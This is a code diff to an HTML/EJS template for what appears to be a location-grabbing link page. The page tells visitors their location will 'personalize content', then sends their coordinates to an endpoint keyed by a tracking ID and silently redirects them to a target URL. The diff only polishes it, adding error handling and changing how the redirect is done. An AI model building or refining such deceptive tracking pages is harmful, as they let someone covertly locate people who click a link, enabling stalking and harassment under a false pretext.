@@ -11,7 +11,7 @@
   </head>
   <body style="font-family: sans-serif; padding: 2rem">
     <h2>We need your permission to improve your experience</h2>
-    <p>To continue, we’ll ask for your approximate location to help personalize content.</p>
+    <p>To continue, we'll ask for your approximate location to help personalize content.</p>
     <button onclick="getLocation()">Grant Location Access</button>
 
     <div id="status" style="margin-top: 1rem"></div>
@@ -24,18 +24,24 @@
           async (position) => {
             const { latitude, longitude } = position.coords;
 
-            await fetch('/api/v1/location/<%= trackingId %>', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ latitude, longitude }),
-            });
+            try {
+              await fetch('/api/v1/location/<%= trackingId %>', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude, longitude }),
+              });
 
-            setTimeout(() => {
               document.getElementById('status').innerText =
                 'Location shared successfully! Redirecting...';
-            }, 500);
 
-            window.open('<%= targetUrl %>', '_self');
+              // Use window.location.href instead of window.open with _self
+              setTimeout(() => {
+                window.location.href = '<%= targetUrl %>';
+              }, 500);
+            } catch (error) {
+              console.error('Error sending location', error);
+              document.getElementById('status').innerText = 'Failed to send location data.';
+            }
           },
           (error) => {
             console.error('Error getting location', error);
